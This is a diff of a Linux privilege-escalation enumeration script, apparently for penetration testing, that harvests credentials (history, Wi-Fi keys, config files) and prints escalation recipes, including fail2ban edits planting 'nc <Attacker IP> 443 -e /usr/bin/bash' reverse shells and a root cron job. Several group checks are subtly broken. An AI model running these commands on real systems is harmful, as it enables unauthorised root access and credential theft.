@@ -8,13 +8,9 @@ GREEN="\033[01;32m"
 GRAY="\e[0;37m"
 YELLOW='\e[1;93m'
 XX="\033[0m" #--- Close COLOR
-#------------------> Clear Screen:
-echo -e "\n\n${RED}╚════{ Clearing Terminal${XX}"
-sleep 0.5
-clear 
+#------------------> Load script:
 echo -e "\n\n${GREEN}╚════{ Loading Script...${XX}"
 sleep 2
-clear
 #------------------> Banner:
 echo -e "\n"
 echo -e "\n"
@@ -29,7 +25,7 @@ echo -e "
         ▀▀▀██████████████████████▀▀▀         ╚═══██╗██║╚██╔╝██║██╔══██║ ╚═══██╗██╔══██║     ██╔══╝       ██╔══██╗██║  ██║██║  ██║   ██║
                                             ██████╔╝██║ ╚═╝ ██║██║  ██║██████╔╝██║  ██║     ███████╗     ██║  ██║╚█████╔╝╚█████╔╝   ██║
            █                  █             ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝     ╚══════╝     ╚═╝  ╚═╝ ╚════╝  ╚════╝    ╚═╝
-            █    ██▀▀▀▀██    █              ═════════════════════════════════════════════════════════{Privilege Escalation Script v3.6}
+            █    ██▀▀▀▀██    █              ═════════════════════════════════════════════════════════{Privilege Escalation Script v4.0}
              █  ▀        ▀  █
               ██▄████████▄██
                 ▀████████▀
@@ -54,6 +50,9 @@ sleep 0.1
 echo -e "\n${BLUE}Rᴇᴄᴏᴍᴍᴇɴᴅᴀᴛɪᴏɴ:${XX}"
 sleep 0.1
 echo -e "\tNᴇᴠᴇʀ ʀᴇʟᴀʏ ᴏɴ ᴀ sɪɴɢʟᴇ ᴛᴏᴏʟ, & ᴅᴏ ᴍᴀɴᴜᴀʟ ᴇɴᴜᴍᴇʀᴀᴛɪᴏɴ."
+sleep 0.1
+echo -e "\n${BLUE}Mʏ Gɪᴛʜᴜʙ:${XX}"
+echo -e "\thttps://github.com/projectHULK${XX}"
 sleep 0.1
 echo -e "\n${BLUE}Sᴄᴀɴ Sᴛᴀʀᴛᴇᴅ Aᴛ:${XX}"
 echo -e "\t"; date
@@ -108,15 +107,19 @@ echo -e "\n${BLUE}╔═════{ Can we read other user's history files?${X
         echo -e "\t║Have a look at history files, they might have sensitive information.                                                ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ Are we in a restricted shell?${XX}"
-    env | grep -i "rbash\|chroot"
-        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║Bypass Restricted Shell:                                                                                            ║"
-        echo -e "\t║    https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/                                             ║"
-        echo -e "\t║    https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf                           ║"
-        echo -e "\t║If non of the above worked, try:                                                                                    ║"
-        echo -e "\t║    echo '$'PATH                                                                                                    ║"
-        echo -e "\t║    ls the directory and find an exploit                                                                            ║"
-        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+        res="$(env)"
+        if [[ $res == *"rbash"* ]] || [[ $res == *"chroot"* ]]; then
+            echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+            echo -e "\t║Bypass Restricted Shell:                                                                                            ║"
+            echo -e "\t║    https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/                                             ║"
+            echo -e "\t║    https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf                           ║"
+            echo -e "\t║If non of the above worked, try:                                                                                    ║"
+            echo -e "\t║    echo '$'PATH                                                                                                    ║"
+            echo -e "\t║    ls the directory and find an exploit                                                                            ║"
+            echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+        else
+            echo -e "${GREEN}	Not in restricted shell${XX}"
+        fi
 echo -e "\n${BLUE}╔═════{ which users have recently used sudo:${XX}"
     if [ -r /var/log/auth.log ];
         then
@@ -124,8 +127,6 @@ echo -e "\n${BLUE}╔═════{ which users have recently used sudo:${XX}"
         else
             echo -e "${RED}	Permission Denied${XX}"
     fi
-echo -e "\n${BLUE}╔═════{ User ID:${XX}"
-    id | grep "root\|$"
 echo -e "\n${BLUE}╔═════{ User Groups:${XX}"
     groups | grep "root\|$"
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
@@ -139,83 +140,122 @@ echo -e "\n${BLUE}╔═════{ Are we in Docker:${XX}"
         echo -e "\t║    mkdir /hdd && mount /dev/sda1 /hdd && chroot /hdd                                                               ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ User ID & Groups possible escap:${XX}"
-    id | grep --color=always -i "docker\|lxd\|auth\|lpadmin\|adm\|sudo\|video\|disk\|disk\|shadow\|fail2ban\|sambashare\|root" 2>/dev/null
-        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║Docker:                                                                                                             ║"
-        echo -e "\t║Run:                                                                                                                ║"
-        echo -e "\t║    1) docker image ls                                                                                              ║"
-        echo -e "\t║    2) docker run -v /:/mnt --rm -it <Image_Name> chroot /mnt sh                                                    ║"
-        echo -e "\t║https://gtfobins.github.io/gtfobins/docker/                                                                         ║"
-        echo -e "\t║https://www.hackingarticles.in/docker-privilege-escalation/                                                         ║"
-        echo -e "\t║https://fosterelli.co/privilege-escalation-via-docker.html                                                          ║"
-        echo -e "\t║https://medium.com/@anushibin007/ha-chakravyuh-vulnhub-walkthrough-2be29373722a                                     ║"
-        echo -e "\t║====================================================================================================================║"
-        echo -e "\t║LXD/LXC:                                                                                                            ║"
-        echo -e "\t║https://www.hackingarticles.in/lxd-privilege-escalation/                                                            ║"
-        echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/                              ║"
-        echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation    ║"
-        echo -e "\t║====================================================================================================================║"
-        echo -e "\t║sambashare:                                                                                                         ║"
-        echo -e "\t║https://www.securityfocus.com/bid/9619/exploit                                                                      ║"
-        echo -e "\t║====================================================================================================================║"
-        echo -e "\t║lpadmin:                                                                                                            ║"
-        echo -e "\t║Members of lpadmin can read /var/run/cups/certs/0. With this key it is possible to access the cups web interface as ║"
-        echo -e "\t║admin. You can edit the cups config file and set the page log to any filename you want (for example /etc/shadow).   ║"
-        echo -e "\t║Then you can read the file contents by viewing the cups page log. By printing you can also write some random data   ║"
-        echo -e "\t║to the given file.                                                                                                  ║"
-        echo -e "\t║Exploit:                                                                                                            ║"
-        echo -e "\t║https://www.exploit-db.com/exploits/43418                                                                           ║"
-        echo -e "\t║Read More:                                                                                                          ║"
-        echo -e "\t║https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791                                                            ║"
-        echo -e "\t║====================================================================================================================║"
-        echo -e "\t║sudo/admin:                                                                                                         ║"
-        echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║"
-        echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║"
-        echo -e "\t║====================================================================================================================║"
-        echo -e "\t║Video:                                                                                                              ║"
-        echo -e "\t║The video group can be used locally to give a set of users access to a video device or to the screen output.        ║"
-        echo -e "\t║This could be exploit d by taking a screenshot of the current screen output and gathering any private information   ║"
-        echo -e "\t║such as user passwords or hashes.                                                                                   ║"
-        echo -e "\t║Esc from video:-                                                                                                    ║"
-        echo -e "\t║https://github.com/frizb/Linux-Privilege-Escalation                                                                 ║"
-        echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║"
-        echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║"
-        echo -e "\t║====================================================================================================================║"
-        echo -e "\t║Disk:                                                                                                               ║"
-        echo -e "\t║The disk group provides users with access to the raw data contained in disks and partitions.                        ║"
-        echo -e "\t║Esc from disk:-                                                                                                     ║"
-        echo -e "\t║https://github.com/frizb/Linux-Privilege-Escalation                                                                 ║"
-        echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║"
-        echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║"
-        echo -e "\t║====================================================================================================================║"
-        echo -e "\t║Shadow:                                                                                                             ║"
-        echo -e "\t║Since users in this group have access to view the /etc/shadow file, this can be exploit d by cracking password      ║"
-        echo -e "\t║hashes found in it.                                                                                                 ║"
-        echo -e "\t║Esc from shadow:-                                                                                                   ║"
-        echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║"
-        echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║"
-        echo -e "\t║====================================================================================================================║"
-        echo -e "\t║Adm:                                                                                                                ║"
-        echo -e "\t║Usually members of the group adm have permissions to read log files located inside /var/log/. take a look :D        ║"
-        echo -e "\t║====================================================================================================================║"
-        echo -e "\t║fial2ban:                                                                                                           ║"
-        echo -e "\t║File2Ban Enumeration:                                                                                               ║"
-        echo -e "\t║    ls -l /etc/fail2ban/                                                                                            ║"
-        echo -e "\t║    cat /etc/fail2ban/README.fox                                                                                    ║"
-        echo -e "\t║    ls -l /etc/fail2ban/action.d (Do we have write permissions)                                                     ║"
-        echo -e "\t║Reverse Shell: ** PUT SED COMMAND IN ONE LINE **                                                                    ║"
-        echo -e "\t║    which nc bash sh                                                                                                ║"
-        echo -e "\t║Way1)                                                                                                               ║"
-        echo -e "\t║    sed -i 's:actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>:actionban = nc <Attacker IP> 443 -e     ║"
-        echo -e "\t║    /usr/bin/bash:g' /etc/fail2ban/action.d/iptables-multiport.conf                                                 ║"
-        echo -e "\t║Way2) create a cron job as root:                                                                                    ║"
-        echo -e "\t║    sed -i 's:actionban = nc <Attacker IP> 443 -e /usr/bin/bash:actionban = echo '*  *  *  *  * root nc             ║"
-        echo -e "\t║    <Attacker IP> 443 -e /usr/bin/bash' >> /etc/crontab:g' /etc/fail2ban/action.d/iptables-multiport.conf           ║"
-        echo -e "\t║https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7   ║"
-        echo -e "\t║====================================================================================================================║"
-        echo -e "\t║auth:                                                                                                               ║"
-        echo -e "\t║https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot                      ║"
-        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+    id
+        output="$(id -Gn)"
+        if [[ $output == *"root"* ]]; then
+                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+                echo -e "\t║root:                                                                                                               ║"
+                echo -e "\t║You are root                                                                                                        ║"
+                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝" 
+        fi
+        if [[ $output == *"docker"* ]]; then
+                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+                echo -e "\t║Docker:                                                                                                             ║"
+                echo -e "\t║Run:                                                                                                                ║"
+                echo -e "\t║    1) docker image ls                                                                                              ║"
+                echo -e "\t║    2) docker run -v /:/mnt --rm -it <Image_Name> chroot /mnt sh                                                    ║"
+                echo -e "\t║https://gtfobins.github.io/gtfobins/docker/                                                                         ║"
+                echo -e "\t║https://www.hackingarticles.in/docker-privilege-escalation/                                                         ║"
+                echo -e "\t║https://fosterelli.co/privilege-escalation-via-docker.html                                                          ║"
+                echo -e "\t║https://medium.com/@anushibin007/ha-chakravyuh-vulnhub-walkthrough-2be29373722a                                     ║"
+                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝" 
+        fi
+        if [[ $output == *"LXD/LXC"* ]]; then
+                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+                echo -e "\t║LXD/LXC:                                                                                                            ║"
+                echo -e "\t║https://www.hackingarticles.in/lxd-privilege-escalation/                                                            ║"
+                echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/                              ║"
+                echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation    ║"
+                echo -e "\t║====================================================================================================================║"
+                echo -e "\t║sambashare:                                                                                                         ║"
+                echo -e "\t║https://www.securityfocus.com/bid/9619/exploit                                                                      ║"
+                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+        fi
+        if [[ $output == *"lpadmin"* ]]; then
+                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+                echo -e "\t║lpadmin:                                                                                                            ║"
+                echo -e "\t║Members of lpadmin can read /var/run/cups/certs/0. With this key it is possible to access the cups web interface as ║"
+                echo -e "\t║admin. You can edit the cups config file and set the page log to any filename you want (for example /etc/shadow).   ║"
+                echo -e "\t║Then you can read the file contents by viewing the cups page log. By printing you can also write some random data   ║"
+                echo -e "\t║to the given file.                                                                                                  ║"
+                echo -e "\t║Exploit:                                                                                                            ║"
+                echo -e "\t║https://www.exploit-db.com/exploits/43418                                                                           ║"
+                echo -e "\t║Read More:                                                                                                          ║"
+                echo -e "\t║https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791                                                            ║"
+                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+        fi
+        if [[ $output == *"sudo/admin"* ]]; then
+                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+                echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║"
+                echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║"
+                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+        fi
+        if [[ $output == *"Video"* ]]; then
+                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+                echo -e "\t║Video:                                                                                                              ║"
+                echo -e "\t║The video group can be used locally to give a set of users access to a video device or to the screen output.        ║"
+                echo -e "\t║This could be exploit d by taking a screenshot of the current screen output and gathering any private information   ║"
+                echo -e "\t║such as user passwords or hashes.                                                                                   ║"
+                echo -e "\t║Esc from video:-                                                                                                    ║"
+                echo -e "\t║https://github.com/frizb/Linux-Privilege-Escalation                                                                 ║"
+                echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║"
+                echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║"
+                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+        fi
+        if [[ $output == *"Disk"* ]]; then
+                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+                echo -e "\t║Disk:                                                                                                               ║"
+                echo -e "\t║The disk group provides users with access to the raw data contained in disks and partitions.                        ║"
+                echo -e "\t║Esc from disk:-                                                                                                     ║"
+                echo -e "\t║https://github.com/frizb/Linux-Privilege-Escalation                                                                 ║"
+                echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║"
+                echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║"
+                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+        fi
+        if [[ $output == *"Shadow"* ]]; then
+                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+                echo -e "\t║Shadow:                                                                                                             ║"
+                echo -e "\t║Since users in this group have access to view the /etc/shadow file, this can be exploit d by cracking password      ║"
+                echo -e "\t║hashes found in it.                                                                                                 ║"
+                echo -e "\t║Esc from shadow:-                                                                                                   ║"
+                echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║"
+                echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║"
+                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+        fi
+        if [[ $output == *"adm"* ]]; then
+                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+                echo -e "\t║Adm:                                                                                                                ║"
+                echo -e "\t║Usually members of the group adm have permissions to read log files located inside /var/log/. take a look :D        ║"
+                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+        fi
+        if [[ $output == *"fial2ban"* ]]; then
+                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+                echo -e "\t║fial2ban:                                                                                                           ║"
+                echo -e "\t║File2Ban Enumeration:                                                                                               ║"
+                echo -e "\t║    ls -l /etc/fail2ban/                                                                                            ║"
+                echo -e "\t║    cat /etc/fail2ban/README.fox                                                                                    ║"
+                echo -e "\t║    ls -l /etc/fail2ban/action.d (Do we have write permissions)                                                     ║"
+                echo -e "\t║Reverse Shell: ** PUT SED COMMAND IN ONE LINE **                                                                    ║"
+                echo -e "\t║    which nc bash sh                                                                                                ║"
+                echo -e "\t║Way1)                                                                                                               ║"
+                echo -e "\t║    sed -i 's:actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>:actionban = nc <Attacker IP> 443 -e     ║"
+                echo -e "\t║    /usr/bin/bash:g' /etc/fail2ban/action.d/iptables-multiport.conf                                                 ║"
+                echo -e "\t║Way2) create a cron job as root:                                                                                    ║"
+                echo -e "\t║    sed -i 's:actionban = nc <Attacker IP> 443 -e /usr/bin/bash:actionban = echo '*  *  *  *  * root nc             ║"
+                echo -e "\t║    <Attacker IP> 443 -e /usr/bin/bash' >> /etc/crontab:g' /etc/fail2ban/action.d/iptables-multiport.conf           ║"
+                echo -e "\t║https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7   ║"
+                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+        fi
+        if [[ $output == *"auth"* ]]; then
+                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+                echo -e "\t║auth:                                                                                                               ║"
+                echo -e "\t║https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot                      ║"
+                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+        else
+                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+                echo -e "\t║No possible escap found                                                                                             ║"
+                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+        fi
 echo -e "\n"
 echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
 echo -e "${RED} \t\t ══════════════════════════════════[ Password File Permission & Users ]══════════════════════════════════ ${XX}"
@@ -226,7 +266,7 @@ echo -e "\n"
         echo -e "\t║If an -x- is representing the password field, this indicates that the password is encrypted.                        ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ Password file:${XX}"
-echo -e "\n${BLUE}    ══{ .bash_history${XX}"
+echo -e "${BLUE}    ══{ .bash_history${XX}"
     if [ -f ~/.bash_history ]; 
         then
             cat ~/.bash_history | grep "pass" 2>/dev/null
@@ -379,11 +419,8 @@ echo -e "${RED} \t\t ═══════════════════�
 echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
 echo -e "\n"
 echo -e "\n${BLUE}╔═════{ List Files having password as string:${XX}"
-    grep "password" ~/*.txt
-        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║To list all files having the word password/credentials/hash do the following manually:                              ║"
-        echo -e "\t║${RED}grep -rn -i 'pass\|cred\|hash' / --color=always > password.txt${XX}                                                      ║"
-        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+    echo -e "${BLUE}    ══{ Limit to 50:${XX}"
+    find / -iname "*password*" -type f -ls 2>/dev/null | head -50 
 echo -e "\n${BLUE}╔═════{ Find 'Pass, Hash, Cred' as a file name:${XX}"
     find / -iname "*pass*" -o -iname "*hash*" -o -iname "*cred*" 2>/dev/null | xargs ls -ld 2>/dev/null --color=always | grep -v "/usr/\|/var/\|/opt/\|/sys/"
         echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
@@ -473,25 +510,32 @@ echo -e "\n${BLUE}╔═════{ Password Files:${XX}"
         echo -e  "\t║Read the following files, they might have password or hash in them.                                                 ║"
         echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ WiFi Creds:${XX}"
-    ls -la /etc/NetworkManager/system-connections 2>/dev/null
+     if [ -f "/etc/NetworkManager/system-connections" ]; then
+        ls -la /etc/NetworkManager/system-connections 2>/dev/null
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║There is a file for each connection with its configuration, also you need root privileges to read. However, the     ║"
         echo -e "\t║password isn't encrypted.                                                                                           ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
-echo -e "\n${BLUE}╔═════{ Dump cleartext Pre-Shared Wireless Keys:${XX}"
-    cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep -i "id\|psk"
+        echo -e "\n${BLUE}╔═════{ Dump cleartext Pre-Shared Wireless Keys:${XX}"
+            cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep -i "id\|psk"
+    else
+        echo -e "${RED}	File does not exist${XX}"
+    fi
 echo -e "\n${BLUE}╔═════{ Sensitive files:${XX}"
     ls -la /etc/passwd --color=always 2>/dev/null; ls -la /etc/group --color=always 2>/dev/null; ls -la /etc/profile --color=always 2>/dev/null; ls -la /etc/shadow --color=always 2>/dev/null ; ls -la /etc/master.passwd --color=always 2>/dev/null
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║See if any listed files have weak file permission                                                                   ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ htpasswd:${XX}"
-    find / -iname .htpasswd -print -exec cat {} \; 2>/dev/null
+    if [ -f ".htpasswd" ]; then
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║It is a flat-file used to store usernames and password. This file is generally used by the web server software like ║"
         echo -e "\t║Apache, Nginx, etc. in order to verify the users via HTTP basic authentication they are in ASCII text format.The    ║"
         echo -e "\t║hash maybe cracked using online tools or any cracking password tools.                                               ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+    else
+        echo -e "${RED}	File does not exist${XX}"
+    fi
 echo -e "\n${BLUE}╔═════{ Firefox credentials:${XX}"
     if [ -f "/home/$USER/.mozilla/firefox 2>/dev/null" ]; 
         then
@@ -509,7 +553,11 @@ echo -e "\n${BLUE}╔═════{ Firefox credentials:${XX}"
             echo -e "${RED}	File does not exist${XX}"
     fi
 echo -e "\n${BLUE}╔═════{ Passwords in smb.conf file:${XX}"
-    cat /etc/samba/smb.conf 2>/dev/null | grep -i 'pass\|cred\|hash' --color=always 2>/dev/null
+    if [ -f "/etc/samba/smb.conf" ]; then
+        cat  /etc/samba/smb.conf 2>/dev/null | grep -i 'pass\|cred\|hash' --color=always 2>/dev/null
+    else
+        echo -e "${RED}	File does not exist${XX}"
+    fi
 echo -e "\n${BLUE}╔═════{ Find config.* files 'Excluded /var/ | /usr/':${XX}"
     find / -iname config.* 2>/dev/null | grep -v '/var/\|/usr/' | xargs ls -ld 2>/dev/null
 echo -e "\n${BLUE}╔═════{ Apache2 credentials:${XX}"
@@ -3188,13 +3236,16 @@ echo -e "\n${BLUE}╔═════{ File-systems mounted:${XX}"
 echo -e "\n${BLUE}╔═════{ Unmounted file-systems:${XX}"
     cat /etc/fstab
 echo -e "\n${BLUE}╔═════{ ASLR Settings:${XX}"
-    cat /proc/sys/kernel/randomize_va_space
-        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║Valid Settings:                                                                               ║"
-        echo -e "\t║    0 = Disablabed                                                                            ║"
-        echo -e "\t║    1 = Conservative Randomization                                                            ║"
-        echo -e "\t║    2 = Full Randomization                                                                    ║"
-        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════╝"
+        aslr="$(cat /proc/sys/kernel/randomize_va_space)"
+        if [[ $aslr == *"0"* ]]; then
+                echo -e "Disablabed"
+        fi
+        if [[ $aslr == *"1"* ]]; then
+            echo -e "Conservative Randomization"
+        fi
+        if [[ $aslr == *"2"* ]]; then
+            echo -e "Full Randomization"
+        fi
 echo -e "\n${BLUE}╔═════{ ASLR Address Space:${XX}"
     ldd /bin/bash
 echo -e "\n${BLUE}╔═════{ SELinux status:${XX}"
@@ -3330,11 +3381,15 @@ echo -e "\n${BLUE}╔═════{ System Timer List:${XX}"
 echo -e "\n${BLUE}╔═════{ backuperer.timer:${XX}"
     systemctl list-timers --all | grep backuperer.timer 2>/dev/null ## & sleep 2 ; kill $!
 echo -e "\n${BLUE}    ══{ backuperer.timer location:${XX}"
-        locate backupere.timer
+    back=$(locate backupere.timer)
+    if [ -z "$back" ]; then
+        echo -e "${RED}	backupere.timer not found${XX}"
+    else
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html                                                              ║"
         echo -e "\t║https://steflan-security.com/hack-the-box-tartarsauce-walkthrough/                                                  ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+    fi
 echo -e "\n"
 echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
 echo -e "${RED} \t\t ════════════════════════════════════════════[ System SUID ]═════════════════════════════════════════════ ${XX}"
@@ -3398,7 +3453,8 @@ echo -e "\n${BLUE}╔═════{ Finding System SGID (execute as the group)
 echo -e "\n${BLUE}╔═════{ Find sticky-bit binaries:${XX}"
     find / -type d -perm -1000 -exec ls -ld --color=always {} \; 2>/dev/null
 echo -e "\n${BLUE}╔═════{ World writable scripts invoked as root:${XX}"
-echo -e "\n${RED}Run this command manually: find / -writable -type f 2>/dev/null | xargs ls -la${XX}"
+echo -e "${BLUE}    ══{ Limit to 50:${XX}"
+    find / -writable -type f 2>/dev/null | xargs ls -la 2>/dev/null | head -50
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║If you find a script that is owned by root but is writable by anyone, you can add your own malicious code into it & ║"
         echo -e "\t║it will escalate your privileges when the script runs as root.                                                      ║"
@@ -3419,16 +3475,6 @@ echo -e "\n${BLUE}╔═════{ How Files Can Be Upload/Download:${XX}"
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║Some of them my have file misconfiguration and my lead to user escalation. File Transfer Cheatsheet: Windows & Linux║"
         echo -e "\t║    https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/                                      ║"
-        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
-echo -e "\n${BLUE}╔═════{ Unexpected commands allows you to read and/or write files or even execute command:${XX}"
-        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║sudo awk 'BEGIN {system('/bin/sh')}'                                                                                ║"
-        echo -e "\t║sudo find /etc -exec sh -i \;                                                                                       ║"
-        echo -e "\t║sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh                                                                ║"
-        echo -e "\t║sudo tar c a.tar -I ./runme.sh a                                                                                    ║"
-        echo -e "\t║ftp>!/bin/sh                                                                                                        ║"
-        echo -e "\t║less>! <shell_comand>                                                                                               ║"
-        echo -e "\t║                                Give it a try                                                                       ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ Profile files:${XX}"
     ls -la /etc/profile --color=always
@@ -3511,11 +3557,11 @@ echo -e "\n${BLUE}╔═════{ Is VNC running on the system:${XX}"
 echo -e "\n${BLUE}╔═════{ Are service config files readable/wreitable by current user:${XX}"
     find /etc/init.d/ -uid 0 -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null
 echo -e "\n${BLUE}╔═════{ Shared object libraries (GOOD FOR BACKDOOR):${XX}"
-        if [ -f /usr/local/bin/program ]; 
-            then
-                ldd /usr/local/bin/program 2>/dev/null
-            else
-                echo -e "${RED}	File does not exist${XX}"
+    if [ -f /usr/local/bin/program ]; 
+        then
+            ldd /usr/local/bin/program 2>/dev/null
+        else
+            echo -e "${RED}	File does not exist${XX}"
     fi
 echo -e "\n${BLUE}╔═════{ Is the executable compiled with RPATH or RUNPATH (GOOD FOR BACKDOOR):${XX}"
     objdump -x /usr/local/bin/program 2>/dev/null | grep -i "RPATH\|RUNPATH"
@@ -3697,14 +3743,19 @@ echo -e "\n${BLUE}╔═════{ ssh_config File:${XX}"
             echo -e "\n${BLUE}    ══{ Max Sessions Allowed 'defaults is 10':${XX}"
                 cat /etc/ssh/ssh_config | grep MaxSession
             echo -e "\n${BLUE}    ══{ Is HashKnownHosts Enable:${XX}"
